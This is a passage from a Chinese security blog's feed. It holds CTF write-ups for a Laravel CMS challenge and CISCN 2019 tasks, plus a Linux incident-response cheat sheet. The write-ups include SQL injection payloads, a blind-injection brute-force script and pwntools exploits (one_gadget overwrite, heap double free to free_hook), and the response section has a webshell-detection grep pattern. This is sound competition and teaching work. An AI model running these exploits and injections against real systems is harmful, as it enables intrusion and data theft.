href="https://blog.stkusami.com/archives/56" target="_blank" rel="noopener">传送门</a><br><img src="/img/2019-09-11/img_17.png" srcset="/img/static/loading.gif" alt=""><br>成了，直接getshell拿flag<br><img src="/img/2019-09-11/img_18.png" srcset="/img/static/loading.gif" alt=""><br>flag{Oiahhh1_iiu123}</p><h6 id="找漏洞"><a href="#找漏洞" class="headerlink" title="找漏洞"></a>找漏洞</h6><p>题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？<br>这道题大佬做出来了，我就学习一波。<br>根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。<br>首先审计一下路由有什么可以用的。<br><img src="/img/2019-09-11/img_19.png" srcset="/img/static/loading.gif" alt=""><br>可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\Http\Controllers\UserController 里面的index方法。<br><img src="/img/2019-09-11/img_20.png" srcset="/img/static/loading.gif" alt=""><br>可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据<br><img src="/img/2019-09-11/img_21.png" srcset="/img/static/loading.gif" alt=""><br>可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\backup\database\factories\UserFactory.php<br><img src="/img/2019-09-11/img_22.png" srcset="/img/static/loading.gif" alt=""><br>总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……<br><img src="/img/2019-09-11/img_23.png" srcset="/img/static/loading.gif" alt=""><br>登陆后台之后，就直接跳到上传吧<br><img src="/img/2019-09-11/img_24.png" srcset="/img/static/loading.gif" alt=""><br>首先带着cookie访问<code>http://119.61.19.212:8085/home/uploadto_upload</code>，会得到一个html<br><img src="/img/2019-09-11/img_25.png" srcset="/img/static/loading.gif" alt=""><br>意思是按照这个格式构造上传包。这里需要改改。Action填入的是<code>http://119.61.19.212:8085/home/uploadss/NotAllow6171</code>,<code>files</code>标签也要改。改成符合上传包的格式,这里需要注意<code>uploadss</code>后面是需要跟一个key，key从哪里来?回头看看数据库第二条。<br><img src="/img/2019-09-11/img_26.png" srcset="/img/static/loading.gif" alt=""><br><del>首先这里……十分恶心</del>。刚开始一直以为上传点是不行的。然后我在源码注意到了<code>template.blade.php</code>。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦<br><img src="/img/2019-09-11/img_27.png" srcset="/img/static/loading.gif" alt=""><br>但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取<br><img src="/img/2019-09-11/img_28.png" srcset="/img/static/loading.gif" alt=""><br>这个怎么用呢，看下图吧<br><img src="/img/2019-09-11/img_29.png" srcset="/img/static/loading.gif" alt=""><br>构造post包发送<br><img src="/img/2019-09-11/img_30.png" srcset="/img/static/loading.gif" alt=""><br>访问<code>http://119.61.19.212:8085/home/profile</code>出flag<br><img src="/img/2019-09-11/img_31.png" srcset="/img/static/loading.gif" alt=""><br>flag{Ucan_wow_easy_qaq}</p>]]></content>
    
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>web</tag>
      
      <tag>writewp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应之linux篇</title>
    <link href="/2019/07/22/Emergency_Response/"/>
    <url>/2019/07/22/Emergency_Response/</url>
    
    <content type="html"><![CDATA[<h4 id="记录一些常用linux应急响应知识"><a href="#记录一些常用linux应急响应知识" class="headerlink" title="记录一些常用linux应急响应知识"></a>记录一些常用linux应急响应知识</h4><a id="more"></a><h6 id="表现为卡慢-性能资源紧张"><a href="#表现为卡慢-性能资源紧张" class="headerlink" title="表现为卡慢-性能资源紧张"></a>表现为卡慢-性能资源紧张</h6><pre><code class="hljs bash">free -m               <span class="hljs-comment">#以MB为单位查看内存使用情况  </span>free -l               <span class="hljs-comment">#查看内存使用细节  </span>ps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head <span class="hljs-comment">#查看内存使用前十名  </span>vmstat -a             <span class="hljs-comment">#查看CPU使用详情  </span>vmstat -d             <span class="hljs-comment">#查看CPU使用详情</span></code></pre><h6 id="宕机死机"><a href="#宕机死机" class="headerlink" title="宕机死机"></a>宕机死机</h6><pre><code class="hljs bash">dmesg -T              <span class="hljs-comment">#按时间点查看内核日志  </span>dmesg -T |grep memory <span class="hljs-comment">#查看和内存相关的日志记录  </span>dmesg -T |grep cache  <span class="hljs-comment">#查看和崩溃相关的日志记录  </span>dmesg -T |grep reboot <span class="hljs-comment">#查看和重启相关的日志记录  </span>cat /var/<span class="hljs-built_in">log</span>/syslog   <span class="hljs-comment">#查看系统日志  </span>cat /var/<span class="hljs-built_in">log</span>/kern.log <span class="hljs-comment">#查看内核日志(ubuntu是kern.log，其他是kernel.log)</span></code></pre><h6 id="断网断连排查-表现为网络不通或者间歇性连通"><a href="#断网断连排查-表现为网络不通或者间歇性连通" class="headerlink" title="断网断连排查-表现为网络不通或者间歇性连通"></a>断网断连排查-表现为网络不通或者间歇性连通</h6><pre><code class="hljs bash">iptables -L          <span class="hljs-comment">#查看防火墙  </span>cat /etc/resolv.conf <span class="hljs-comment">#查看域名解析  </span>ifoncifg -a          <span class="hljs-comment">#查看网卡信息</span></code></pre><h6 id="一些服务的日志位置"><a href="#一些服务的日志位置" class="headerlink" title="一些服务的日志位置"></a>一些服务的日志位置</h6><pre><code class="hljs bash">/var/<span class="hljs-built_in">log</span>/httpd/access.log     <span class="hljs-comment">#http服务日志  </span>/var/<span class="hljs-built_in">log</span>/vsftp.log            <span class="hljs-comment">#ftp服务日志  </span>/var/<span class="hljs-built_in">log</span>/samba                <span class="hljs-comment">#samba服务日志  </span>/var/<span class="hljs-built_in">log</span>/message              <span class="hljs-comment">#DNS、DHCP日志</span></code></pre><h6 id="入侵点入侵特征排查"><a href="#入侵点入侵特征排查" class="headerlink" title="入侵点入侵特征排查"></a>入侵点入侵特征排查</h6><pre><code class="hljs bash">netstat -antlop      <span class="hljs-comment">#查看  </span>ps -ef               <span class="hljs-comment">#查看异常连接和对应的文件  </span>ps aux               <span class="hljs-comment">#查看那进程详细信息  </span>lsof -p pid          <span class="hljs-comment">#查看进程关联账户信息  </span>  附录：ps命令常用用法（方便查看系统进程）  ps a  <span class="hljs-comment">#显示现行终端机下的所有程序，包括其他用户的程序。  </span>ps -A <span class="hljs-comment">#显示所有进程。  </span>ps c <span class="hljs-comment">#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  </span>ps -e <span class="hljs-comment">#此参数的效果和指定"A"参数相同。  </span>ps e <span class="hljs-comment">#列出程序时，显示每个程序所使用的环境变量。  </span>ps f <span class="hljs-comment">#用ASCII字符显示树状结构，表达程序间的相互关系。  </span>ps -H <span class="hljs-comment">#显示树状结构，表示程序间的相互关系。  </span>ps -N <span class="hljs-comment">#显示所有的程序，除了执行ps指令终端机下的程序之外。  </span>ps s <span class="hljs-comment">#采用程序信号的格式显示程序状况。  </span>ps S <span class="hljs-comment">#列出程序时，包括已中断的子程序资料。  </span>ps -t&lt;终端机编号&gt; 　<span class="hljs-comment">#指定终端机编号，并列出属于该终端机的程序的状况。  </span>ps u 　 <span class="hljs-comment">#显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  </span>ps x 　<span class="hljs-comment">#显示所有程序，不以终端机来区分。</span></code></pre><p><strong>最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作</strong></p><h6 id="登陆和爆破排查"><a href="#登陆和爆破排查" class="headerlink" title="登陆和爆破排查"></a>登陆和爆破排查</h6><pre><code class="hljs bash">last                        <span class="hljs-comment">#查看登陆或者重启日志  </span>lastb                       <span class="hljs-comment">#查看登录失败日志，或者是cat /var/log/faillog  </span>who /var/<span class="hljs-built_in">log</span>/wtmp           <span class="hljs-comment">#查看登录日志，或者last -f /var/run/utmp  </span>cat /var/<span class="hljs-built_in">log</span>/lastlog        <span class="hljs-comment">#查看最后的登录日志  </span>cat /var/<span class="hljs-built_in">log</span>/secure         <span class="hljs-comment">#查看安全日志  </span>cat /var/<span class="hljs-built_in">log</span>/cron           <span class="hljs-comment">#查看计划任务日志  </span>cat ~/.bash_history | more  <span class="hljs-comment">#查看历史操作  </span>grep <span class="hljs-string">"Failed password for root"</span> /var/<span class="hljs-built_in">log</span>/auth.log | awk <span class="hljs-string">'&#123;print $11&#125;'</span> | sort | uniq -nr | more  <span class="hljs-comment">#查看root账户登录爆破尝试  </span>grep <span class="hljs-string">"Accepted"</span> /var/<span class="hljs-built_in">log</span>/auth.log | awk <span class="hljs-string">'&#123;print $11&#125;'</span> | sort |uniq -c | sort -nr | more <span class="hljs-comment">#查看登录成功日志信息  </span>strings /usr/bin/.sshd | egrep <span class="hljs-string">'[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.'</span>   <span class="hljs-comment">#查看sshd的信息</span></code></pre><h6 id="漏洞利用入侵和后渗透的特征"><a href="#漏洞利用入侵和后渗透的特征" class="headerlink" title="漏洞利用入侵和后渗透的特征"></a>漏洞利用入侵和后渗透的特征</h6><pre><code class="hljs bash"><span class="hljs-comment">#查找webshell:  </span>find /var/www/ -name <span class="hljs-string">"*.php"</span> | xargs egrep <span class="hljs-string">'assert | phpspy | c99sh | milw0rm | eval | \( gunerpress | \(bas464_encode | spider _bc | shell_exec | passthru | \(\$\_\POST\[|eval\(str_rotl3 | .chr\c|\$\&#123;\"\_P|eval\C\$\_R | file_put_contents\C\.\*\$\_ | base64_decode'</span>  <span class="hljs-comment">#文件查找的相关命令：  </span>sudo find / -mtime(atime/ctime) -x   <span class="hljs-comment">#按照创建、修改时间查找  </span>sudo find ./ -perm 4777              <span class="hljs-comment">#按照权限查找文件  </span>find  ./ -mtime -1 -<span class="hljs-built_in">type</span> f           <span class="hljs-comment">#按照文件类型查找  </span>find -mtime -1 -<span class="hljs-built_in">type</span> f -name \*.php  <span class="hljs-comment">#查找最近一天被修改过的php文件</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>国赛华南赛区的一道注入题</title>
    <link href="/2019/06/25/guosaiwp1/"/>
    <url>/2019/06/25/guosaiwp1/</url>
    
    <content type="html"><![CDATA[<p>这次国赛web几乎清一色登录框，而且和平常比赛的题目也有点不同吧（留下了没有技术的泪水）<br><a id="more"></a><br>题目环境搭建<code>apache2+php7.2+mysql</code><br><pre><code class="hljs undefined">ubuntu  apt-get <span class="hljs-keyword">install</span> apache2 php7<span class="hljs-number">.2</span> mysql-<span class="hljs-keyword">server</span> php7<span class="hljs-number">.2</span>-mysql libapache2-<span class="hljs-keyword">mod</span>-php    mysql  /etc/mysql/mysql.conf.d/mysqld.cnf添加secure_file_priv = <span class="hljs-string">"/"</span>  <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">FILE</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">'www-data'</span>@<span class="hljs-string">'%'</span>;  <span class="hljs-keyword">GRANT</span> ALL <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> <span class="hljs-string">`test`</span>.<span class="hljs-string">`user`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">'www-data'</span>@<span class="hljs-string">'%'</span>;</code></pre></p><p>注入点判断payload，过滤了很多参数<br><pre><code class="hljs undefined">admin'<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span>#</code></pre></p><p>成功登陆后提示flag在根目录<br><img src="/img/2019-06-25/1.png" srcset="/img/static/loading.gif" alt="1"><br>mysql读取文件有个方法是用load_file这个命令,具体用法如下<br><pre><code class="hljs undefined">mysql&gt; <span class="hljs-built_in">select</span> load_file(<span class="hljs-string">'/flag'</span>);  +<span class="hljs-comment">--------------------------+  </span>| load_file(<span class="hljs-string">'/flag'</span>)       |  +<span class="hljs-comment">--------------------------+  </span>| ciscn&#123;T2UXiFeu7HzoBj4R&#125;  |  +<span class="hljs-comment">--------------------------+  </span><span class="hljs-number">1</span> row <span class="hljs-keyword">in</span> set (<span class="hljs-number">0.01</span> sec)</code></pre></p><p>因为and被过滤了，<code>^</code>（异或）没有，所以判断语句如下<br><pre><code class="hljs undefined">admin'^<span class="hljs-number">1</span>^<span class="hljs-number">1</span>#</code></pre></p><p><code>^</code>符号的用法如下<br><pre><code class="hljs undefined">mysql&gt; select * <span class="hljs-built_in">from</span> user where username = <span class="hljs-string">'admin'</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span>;  +<span class="hljs-comment">----------+----------+  </span>| username | password |  +<span class="hljs-comment">----------+----------+  </span>| admin    | admin123 |  +<span class="hljs-comment">----------+----------+  </span><span class="hljs-number">1</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>, <span class="hljs-number">2</span> warnings (<span class="hljs-number">0.00</span> <span class="hljs-built_in">sec</span>)    mysql&gt; select * <span class="hljs-built_in">from</span> user where username = <span class="hljs-string">'admin'</span>^<span class="hljs-number">1</span>^<span class="hljs-number">0</span>;  Empty <span class="hljs-built_in">set</span>, <span class="hljs-number">2</span> warnings (<span class="hljs-number">0.00</span> <span class="hljs-built_in">sec</span>)</code></pre></p><p>因此我们需要构造判断结果为1的查询语句，这里要用到<code>like</code>这个方法<br><pre><code class="hljs undefined">mysql&gt; select username like <span class="hljs-string">'a%'</span> <span class="hljs-built_in">from</span> user;  +<span class="hljs-comment">--------------------+  </span>| username like <span class="hljs-string">'a%'</span> |  +<span class="hljs-comment">--------------------+  </span>|                  <span class="hljs-number">1</span> |  +<span class="hljs-comment">--------------------+  </span><span class="hljs-number">1</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0.00</span> <span class="hljs-built_in">sec</span>)    mysql&gt; select username like <span class="hljs-string">'b%'</span> <span class="hljs-built_in">from</span> user;  +<span class="hljs-comment">--------------------+  </span>| username like <span class="hljs-string">'b%'</span> |  +<span class="hljs-comment">--------------------+  </span>|                  <span class="hljs-number">0</span> |  +<span class="hljs-comment">--------------------+  </span><span class="hljs-number">1</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0.00</span> <span class="hljs-built_in">sec</span>)</code></pre></p><p>结合上面我们的payload为<br><pre><code class="hljs undefined">admin'^1^(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">load_file</span>(<span class="hljs-string">'/flag'</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">like</span><span class="hljs-comment">/**/</span><span class="hljs-string">'c%'</span>)</code></pre></p><p>python脚本如下<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> stringurl = <span class="hljs-string">'http://192.168.1.205/ciscn12/web4/index.php'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span><span class="hljs-params">(data)</span>:</span><span class="hljs-keyword">global</span> urlpayload = <span class="hljs-string">"admin'^1^(select/**/load_file('/flag')/**/like/**/'&#123;data&#125;%')#"</span>.format(data = data)proxies = &#123;<span class="hljs-string">"http"</span>: <span class="hljs-string">"http://127.0.0.1:8080"</span>,<span class="hljs-string">"https"</span>: <span class="hljs-string">"http://127.0.0.1:8080"</span>,&#125;data = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">'1'</span>&#125;req = requests.post(url = url,data = data)length = len(req.text)<span class="hljs-keyword">return</span> length<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:flag = <span class="hljs-string">''</span>str = string.letters+string.digits+<span class="hljs-string">'&#123;'</span>+<span class="hljs-string">'&#125;'</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str:flag += ires = query(flag)<span class="hljs-keyword">if</span>(res == <span class="hljs-number">462</span>):<span class="hljs-keyword">break</span><span class="hljs-keyword">else</span>:flag = flag[:<span class="hljs-number">-1</span>]<span class="hljs-keyword">print</span> flag<span class="hljs-keyword">if</span> i == <span class="hljs-string">'&#125;'</span>:<span class="hljs-keyword">break</span></code></pre></p><p>result<br><pre><code class="hljs undefined"><span class="xml">c  ci  cis  cisc  ciscn  ciscn</span><span class="hljs-template-variable">&#123;  ciscn&#123;T  ciscn&#123;T2  ciscn&#123;T2U  ciscn&#123;T2UX  ciscn&#123;T2UXi  ciscn&#123;T2UXiF  ciscn&#123;T2UXiFe  ciscn&#123;T2UXiFeu  ciscn&#123;T2UXiFeu7  ciscn&#123;T2UXiFeu7H  ciscn&#123;T2UXiFeu7Hz  ciscn&#123;T2UXiFeu7Hzo  ciscn&#123;T2UXiFeu7HzoB  ciscn&#123;T2UXiFeu7HzoBj  ciscn&#123;T2UXiFeu7HzoBj4  ciscn&#123;T2UXiFeu7HzoBj4R  ciscn&#123;T2UXiFeu7HzoBj4R&#125;</span><span class="xml"></span></code></pre></p><p>待更新</p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>注入</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛初赛writeup</title>
    <link href="/2019/04/23/guosaiwp/"/>
    <url>/2019/04/23/guosaiwp/</url>
    
    <content type="html"><![CDATA[<p>大佬的博客–&gt;<a href="https://www.ctfwp.com/articals/2019national.html" target="_blank" rel="noopener">传送门</a><br><a id="more"></a></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>摄像头捕捉到三个人的脸即可</p><h3 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h3><p>下载回来一个<code>saleae.logicdata</code>文件，经搜索发现这个saleae的可以打开的文件类型，官网地址–&gt;<a href="https://www.saleae.com/zh/" target="_blank" rel="noopener">传送门</a>，打开文件只发现一些波形<br><img src="/img/2019-04-23/1.png" srcset="/img/static/loading.gif" alt="1"><br>网上搜索资料看到一篇教程通过xor两条数据流得到信息，上面一条是当上面波形的电平为高电平且下面那条也是高电平时为1，下面那条是低电平则为0，如图<br><img src="/img/2019-04-23/2.png" srcset="/img/static/loading.gif" alt="2"><br>最后得到一串数据<br><pre><code class="hljs undefined"><span class="hljs-number">011001100110110001100001011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101</span></code></pre></p><p>8个一组得到flag</p><h4 id="usbasp"><a href="#usbasp" class="headerlink" title="usbasp"></a>usbasp</h4><p>打开文件后在<code>analyzer</code>里选择<code>SPI</code>，设置选项最下面选择<code>enable line is active hight</code><br><img src="/img/2019-04-23/7.png" srcset="/img/static/loading.gif" alt="7"><br>右下面可以明显看到flag导出即可<br><img src="/img/2019-04-23/9.png" srcset="/img/static/loading.gif" alt="9"></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your-pwn"></a>your-pwn</h4><p>在函数<code>sub_B35</code>里面，没有对<code>index(v1)</code>进行检查，从而造成任意地址泄露和任意地址更改。直接改返回地址为<code>one_gadget</code>即可<br><pre><code class="hljs undefined">for ( <span class="hljs-name">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= 40; ++i )</span>&#123;puts(<span class="hljs-string">"input index"</span>)<span class="hljs-comment">;</span>__isoc99_scanf(<span class="hljs-string">"%d"</span>, <span class="hljs-symbol">&amp;v1</span>)<span class="hljs-comment">;</span>printf(<span class="hljs-string">"now value(hex) %x\n"</span>, (<span class="hljs-name">unsigned</span> int)v4[v1])<span class="hljs-comment">;</span>puts(<span class="hljs-string">"input new value"</span>)<span class="hljs-comment">;</span>__isoc99_scanf(<span class="hljs-string">"%d"</span>, <span class="hljs-symbol">&amp;v2</span>)<span class="hljs-comment">;</span>v4[v1] = v2<span class="hljs-comment">;</span>&#125;</code></pre></p><p>详细脚本如下：<br><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>local = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> local:p = process(<span class="hljs-string">"./pwn"</span>)<span class="hljs-keyword">else</span>:p = remote(<span class="hljs-string">"39.97.228.196"</span>,<span class="hljs-number">60007</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pass_</span><span class="hljs-params">()</span>:</span>p.recvuntil(<span class="hljs-string">"name"</span>)p.sendline(<span class="hljs-string">"Team233"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(index, addr)</span>:</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):p.recvuntil(<span class="hljs-string">"index\n"</span>)p.sendline(str(index+i))p.recvuntil(<span class="hljs-string">"now value(hex) "</span>)data = p.recvn(<span class="hljs-number">1</span>)<span class="hljs-comment">#print("data = " + str(data))</span>p.recvuntil(<span class="hljs-string">"input new value\n"</span>)p.sendline(str(addr))addr = addr &gt;&gt; <span class="hljs-number">8</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(index)</span>:</span>addr = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):p.recvuntil(<span class="hljs-string">"index\n"</span>)p.sendline(str(index+i))p.recvuntil(<span class="hljs-string">"now value(hex) "</span>)data = int(p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-keyword">True</span>),<span class="hljs-number">16</span>)<span class="hljs-keyword">if</span> data &gt; <span class="hljs-number">300</span>:data = data - <span class="hljs-number">0xffffff00</span>p.recvuntil(<span class="hljs-string">"input new value\n"</span>)p.sendline(str(data))addr += chr(data)addr = u64(addr)<span class="hljs-keyword">return</span> addr<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">()</span>:</span>pass_()<span class="hljs-comment">#gdb.attach(p)addr = leak(0x158)</span>elf_base = addr - <span class="hljs-number">0xb11</span><span class="hljs-keyword">print</span> <span class="hljs-string">'[*] elf_base :'</span>,hex(elf_base)addr = leak(<span class="hljs-number">0x160</span>+<span class="hljs-number">0x118</span>)libc_base = addr - <span class="hljs-number">0x20830</span>one_shot = libc_base + <span class="hljs-number">0xf02a4</span><span class="hljs-keyword">print</span> <span class="hljs-string">'[*] one_shot :'</span>,hex(one_shot)<span class="hljs-keyword">print</span> <span class="hljs-string">'[*] libc_base :'</span>,hex(libc_base)pause()change(<span class="hljs-number">0x158</span>,one_shot)p.sendline(<span class="hljs-string">"no"</span>)p.sendline(<span class="hljs-string">"cat flag"</span>)p.interactive()exp()</code></pre></p><p><img src="/img/2019-04-23/3.png" srcset="/img/static/loading.gif" alt="3"></p><h4 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h4><p>由于是<code>%s</code>打印内 容，会一直打印遇到<code>\x00</code>才会停止，而且<code>add</code>的时候通过<code>read</code>读入没有写入字符串后缀，所以可以利用这一点可以泄露<code>libc</code>地址和<code>heap</code>地址。泄露利用如下：<br><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x20)</span></span>#<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x20)</span></span>#<span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,<span class="hljs-string">"b"</span>*<span class="hljs-number">0</span>x20)</span></span>#<span class="hljs-number">2</span><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x60,<span class="hljs-string">"a"</span>)</span></span>#<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">()</span></span><span class="hljs-selector-tag">p</span>.recvuntil(<span class="hljs-string">"0 : a"</span>)data = <span class="hljs-string">"\x00"</span>+<span class="hljs-selector-tag">p</span>.recvuntil(<span class="hljs-string">"2"</span>,drop=True)heap = u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))print <span class="hljs-string">"[*]heap : "</span>, hex(heap)<span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x100,<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x20)</span></span>#<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x100,<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x20)</span></span>#<span class="hljs-number">3</span> <span class="hljs-function"><span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>x20,<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x20)</span></span>#<span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-title">create</span><span class="hljs-params">(<span class="hljs-number">0</span>xd0,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)</span></span>#<span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">()</span></span><span class="hljs-selector-tag">p</span>.recvuntil(<span class="hljs-string">"4 : aaaaaaaa"</span>)data = <span class="hljs-selector-tag">p</span>.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">"\x00\x00"</span>libc_base = u64(data) - <span class="hljs-number">0</span>x3c4b78</code></pre></p><p>然后利用<code>free</code>的时候没有检查<code>index(v1)</code>，漏洞点如下程序部分代码，造成<code>UAF</code>分配到<code>bss</code>上的<code>chunk_list</code>，然后改<code>free</code>就可以了 。<br><pre><code class="hljs undefined">printf(<span class="hljs-string">"Please enter the index of daily:"</span>)<span class="hljs-comment">;</span>read(<span class="hljs-number">0</span>, &amp;<span class="hljs-keyword">buf, </span><span class="hljs-number">8</span>uLL)<span class="hljs-comment">;</span><span class="hljs-built_in">v1</span> = atoi(&amp;<span class="hljs-keyword">buf);</span>if ( chunk[<span class="hljs-built_in">v1</span>].ptr )&#123;free((void *)chunk[<span class="hljs-built_in">v1</span>].ptr)<span class="hljs-comment">;</span>chunk[<span class="hljs-built_in">v1</span>].ptr = <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span>LODWORD(chunk[<span class="hljs-built_in">v1</span>].len) = <span class="hljs-number">0</span><span class="hljs-comment">;</span>puts(<span class="hljs-string">"remove successful!!"</span>)<span class="hljs-comment">;</span>--chunk_num<span class="hljs-comment">;</span>&#125;</code></pre></p><p>然后利用<code>Double free</code>得到<code>bss</code>段上的<code>chunk_list</code>,然后控制<code>chunk</code>，实现任意地址写，然后我们写<code>free_hook</code>地址为<code>system</code>，再<code>free</code>的时候就可以<code>getshell</code>了。在这之前，我们尝试了申请到<code>malloc_hook</code>前面然后把<code>malloc_hoook</code>覆盖为<code>one_gadget</code>，但是没有一个<code>one_gadget</code>可以成功，主要是因为条件没有满足，后来就直接<code>free_hook</code>了。详细脚本如下：<br><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>local = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> local:p = process(<span class="hljs-string">"./pwn"</span>)<span class="hljs-keyword">else</span>:p = remote(<span class="hljs-string">"39.97.228.196"</span>,<span class="hljs-number">60006</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"1"</span>) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(lens,content)</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"2"</span>) p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(str(lens)) p.recv()p.send(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">(index,content)</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"3"</span>) p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(str(index)) p.recv()p.send(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"4"</span>) p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(str(index)) chunk_list = <span 